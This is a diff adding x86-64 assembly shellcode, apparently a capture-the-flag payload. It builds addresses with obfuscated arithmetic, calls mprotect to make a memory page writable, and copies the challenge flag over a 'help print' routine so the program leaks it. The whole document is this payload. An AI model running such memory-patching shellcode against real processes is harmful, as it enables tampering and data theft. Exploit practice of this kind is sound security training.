@@ -1,0 +1,78 @@
+push rax
+push rbx
+push rcx
+push rdx
+push rdi
+push rsi
+push r8
+push r9
+
+
+xor rbx, rbx
+or rbx, 1
+shl rbx, 13
+xor rax, rax
+or rax, 1
+shl rax, 12
+add rbx, rax
+shr rax, 3
+add rbx, rax
+add rdx, rbx
+mov rax, [rdx]
+xor rbx, rbx
+or rbx, 1
+shl rbx, 9
+add rax, rbx
+shr rbx, 1
+xor rcx, rcx
+or rcx, 1
+shl rcx, 4
+sub rbx, rcx
+add rax, rbx
+
+mov rcx, rax
+xor rbx, rbx
+or rbx, 1
+shl rbx, 13
+sub rcx, rbx
+shr rbx, 8
+sub rcx, rbx
+shr rbx, 3
+add rcx, rbx
+push rcx
+push rax
+
+# rax = flag location, rcx = help prinrt 0x2c04
+push rcx
+pop rdi
+xor rbx, rbx
+or rbx, 1
+shl rbx, 12
+push rbx
+pop rsi
+push 6
+pop rdx
+push 5
+pop rbx
+push 5
+pop rcx
+add rbx, rcx
+push rbx
+pop rax
+syscall
+
+
+pop rax
+pop rcx
+mov rdx, [rax]
+mov [rcx], rdx
+
+pop r9
+pop r8
+pop rsi
+pop rdi
+pop rdx
+pop rcx
+pop rbx
+pop rax
+ret
